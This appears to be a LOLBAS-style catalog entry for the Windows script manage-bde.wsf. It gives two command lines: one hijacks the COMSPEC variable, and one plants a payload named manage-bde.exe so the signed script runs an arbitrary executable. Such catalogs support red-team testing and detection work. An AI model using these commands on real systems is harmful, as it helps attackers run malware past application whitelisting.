## Manage-bde.wsf
* Functions: Execute
```

set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf
Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.

copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.
```
   
* Resources:   
  * https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
  * https://twitter.com/bohops/status/980659399495741441
   
* Full path:   
  * C:\Windows\System32\manage-bde.wsf
   
* Notes: Thanks to Jimmy - @bophops (Comspec), Daniel Bohannon - @danielhbohannon (Path Hijack)  
   
